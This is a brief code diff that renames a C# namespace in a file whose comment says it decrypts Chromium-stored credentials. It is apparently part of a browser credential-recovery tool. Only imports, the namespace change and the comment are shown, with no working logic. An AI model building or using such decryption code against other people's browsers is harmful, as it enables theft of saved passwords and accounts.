@@ -9,7 +9,7 @@ using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
 
-namespace Everything.Recovery.Browsers
+namespace Ton618.Recovery.Browsers
 {
     /// <summary>
     /// Provides methods to decrypt Chromium credentials.
